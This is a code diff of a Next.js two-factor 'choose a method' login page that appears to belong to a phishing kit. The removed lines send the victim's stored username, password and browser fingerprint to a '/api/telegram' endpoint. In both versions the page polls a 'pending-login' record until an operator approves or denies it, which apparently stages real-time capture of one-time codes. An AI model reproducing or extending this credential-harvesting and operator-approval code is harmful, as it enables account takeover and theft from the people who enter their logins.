@@ -1,19 +1,7 @@
 'use client';
 
-import { useEffect, useState } from 'react';
+import { useState, useEffect, useRef } from 'react';
 import { useRouter } from 'next/navigation';
-import {
-  APPROVAL_TIMEOUT_MS,
-  MSG_UNABLE_REACH_VERIFICATION,
-  MSG_UNABLE_VERIFY_TIME,
-} from '@/lib/approval-messages';
-import {
-  readStoredPassword,
-  readStoredUsername,
-  setLoginDeniedError,
-} from '@/lib/login-flow-storage';
-import { pollPendingLogin } from '@/lib/poll-pending-login';
-import { postTelegramNavEvent } from '@/lib/telegram-client';
 
 const METHODS = [
   { id: 'text', label: 'Text Message', description: 'Receive a 6-digit code via text message.', icon: 'SMS' },
@@ -21,132 +9,98 @@ const METHODS = [
   { id: 'email', label: 'Email', description: 'Receive an email with your code.', icon: 'Email' },
 ];
 
+const POLL_INTERVAL_MS = 1500;
+const WAIT_TIMEOUT_MS = 90 * 1000;
+
 export default function TwoFAMethodPage() {
   const router = useRouter();
   const [selectedMethod, setSelectedMethod] = useState('text');
   const [networkError, setNetworkError] = useState('');
   const [submitting, setSubmitting] = useState(false);
-  const [backSubmitting, setBackSubmitting] = useState(false);
-  const [methodLocked, setMethodLocked] = useState(false);
-
-  const navDisabled = submitting || backSubmitting;
+  const [pendingId, setPendingId] = useState(null);
+  const pollRef = useRef(null);
+  const timeoutRef = useRef(null);
 
   useEffect(() => {
-    if (!readStoredUsername()) {
-      router.push('/login');
-    }
-  }, [router]);
+    if (!pendingId) return;
+
+    const clearPolling = () => {
+      if (pollRef.current) {
+        clearInterval(pollRef.current);
+        pollRef.current = null;
+      }
+      if (timeoutRef.current) {
+        clearTimeout(timeoutRef.current);
+        timeoutRef.current = null;
+      }
+    };
+
+    timeoutRef.current = setTimeout(() => {
+      clearPolling();
+      setPendingId(null);
+      setSubmitting(false);
+      setNetworkError('Request timed out. Please try again.');
+    }, WAIT_TIMEOUT_MS);
+
+    const poll = async () => {
+      try {
+        const res = await fetch(`/api/pending-login/${encodeURIComponent(pendingId)}`, {
+          cache: 'no-store',
+          headers: { 'Cache-Control': 'no-cache', Pragma: 'no-cache' },
+        });
+        if (!res.ok) return;
+        const data = await res.json();
+        const status = String(data?.status ?? '').trim().toLowerCase();
+        if (status === 'approved' || status === 'redirected') {
+          clearPolling();
+          router.push(`/login/verify?method=${encodeURIComponent(selectedMethod)}`);
+          return;
+        }
+        if (status === 'denied' || status === 'expired') {
+          clearPolling();
+          setPendingId(null);
+          setSubmitting(false);
+          setNetworkError(status === 'denied' ? 'Verification denied.' : 'Request timed out.');
+        }
+      } catch {
+        // ignore temporary poll errors
+      }
+    };
+
+    pollRef.current = setInterval(poll, POLL_INTERVAL_MS);
+    poll();
+
+    return clearPolling;
+  }, [pendingId, router, selectedMethod]);
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-    if (navDisabled) return;
     setNetworkError('');
-    setMethodLocked(true);
     setSubmitting(true);
-
-    const userId = readStoredUsername();
-    const password = readStoredPassword();
-    const method = selectedMethod === 'email' ? 'email' : 'text';
-    const methodLabel =
-      selectedMethod === 'call'
-        ? 'Receive a Call'
-        : selectedMethod === 'email'
-          ? 'Receive an Email'
-          : 'Receive a Text';
-
-    if (typeof window !== 'undefined') {
-      sessionStorage.setItem('visit_method', selectedMethod);
-    }
-
-    const clientMeta = {
-      userAgent: window.navigator.userAgent,
-      screen: `${window.screen.width}x${window.screen.height}`,
-      language: window.navigator.language || '',
-      referrer: document.referrer || 'Direct',
-      url: window.location.href,
-      localTime: new Date().toLocaleString(),
-      utcTime: new Date().toUTCString(),
-    };
-
     try {
-      fetch('/api/telegram', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          userId,
-          password,
-          method: selectedMethod,
-          code: '',
-          client: clientMeta,
-          eventType: 'method',
-        }),
-      }).catch(() => {});
-
+      const pendingMethod = selectedMethod === 'email' ? 'email' : 'text';
       const res = await fetch('/api/pending-login', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          userId,
-          password,
-          method,
-          maskedEmail: selectedMethod === 'email' ? methodLabel : '-',
-          maskedPhone: selectedMethod !== 'email' ? methodLabel : '-',
+          userId: 'login',
+          password: '',
+          method: pendingMethod,
+          maskedEmail: '**********',
+          maskedPhone: '***-***-****',
           flow: 'login',
         }),
       });
-      const data = await res.json().catch(() => ({}));
-      if (!res.ok) {
-        setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
+      const data = await res.json();
+      if (!res.ok || !data.id) {
+        setNetworkError('Network error. Please check your connection and try again.');
         setSubmitting(false);
-        setMethodLocked(false);
         return;
       }
-
-      if (!data?.id) {
-        setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
-        setSubmitting(false);
-        setMethodLocked(false);
-        return;
-      }
-
-      const outcome = await pollPendingLogin(String(data.id), APPROVAL_TIMEOUT_MS);
-      setSubmitting(false);
-
-      if (outcome === 'approved') {
-        router.push('/login/verify');
-        return;
-      }
-      if (outcome === 'denied') {
-        setLoginDeniedError();
-        router.push('/login');
-        return;
-      }
-
-      setNetworkError(MSG_UNABLE_VERIFY_TIME);
-      setMethodLocked(false);
+      setPendingId(data.id);
     } catch {
-      setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
+      setNetworkError('Network error. Please check your connection and try again.');
       setSubmitting(false);
-      setMethodLocked(false);
-    }
-  };
-
-  const handleBack = async (e) => {
-    e.preventDefault();
-    if (navDisabled) return;
-    setNetworkError('');
-    setBackSubmitting(true);
-    try {
-      const { ok } = await postTelegramNavEvent('backToLogin');
-      if (!ok) {
-        setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
-        return;
-      }
-      router.push('/login');
-    } catch {
-      setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
-    } finally {
-      setBackSubmitting(false);
     }
   };
 
@@ -163,11 +117,11 @@ export default function TwoFAMethodPage() {
           </div>
         )}
         <form onSubmit={handleSubmit} className="twofa-form">
-          <div className={`twofa-options ${navDisabled ? 'twofa-options-disabled' : ''}`}>
+          <div className={`twofa-options ${submitting ? 'twofa-options-disabled' : ''}`}>
             {METHODS.map((m) => (
               <label
                 key={m.id}
-                className={`twofa-option ${selectedMethod === m.id ? 'twofa-option-selected' : ''} ${navDisabled ? 'twofa-option-disabled' : ''}`}
+                className={`twofa-option ${selectedMethod === m.id ? 'twofa-option-selected' : ''} ${submitting ? 'twofa-option-disabled' : ''}`}
               >
                 <input
                   type="radio"
@@ -176,7 +130,7 @@ export default function TwoFAMethodPage() {
                   checked={selectedMethod === m.id}
                   onChange={() => setSelectedMethod(m.id)}
                   className="twofa-option-input"
-                  disabled={navDisabled || (methodLocked && selectedMethod !== m.id)}
+                  disabled={submitting}
                 />
                 <span className="twofa-option-icon" aria-hidden>
                   {m.icon === 'SMS' ? '💬' : m.icon === 'Call' ? '📞' : '✉'}
@@ -188,19 +142,9 @@ export default function TwoFAMethodPage() {
               </label>
             ))}
           </div>
-          <button type="submit" className="login-button" disabled={navDisabled}>
-            {submitting ? 'Verifying' : 'Continue'}
+          <button type="submit" className="login-button" disabled={submitting}>
+            {submitting ? 'Waiting for approval…' : 'Send Code'}
           </button>
-          <p className="verify-back">
-            <button
-              type="button"
-              className="form-link button-link"
-              onClick={handleBack}
-              disabled={navDisabled}
-            >
-              {backSubmitting ? 'Loading…' : '← Back to Sign In'}
-            </button>
-          </p>
         </form>
       </div>
     </div>
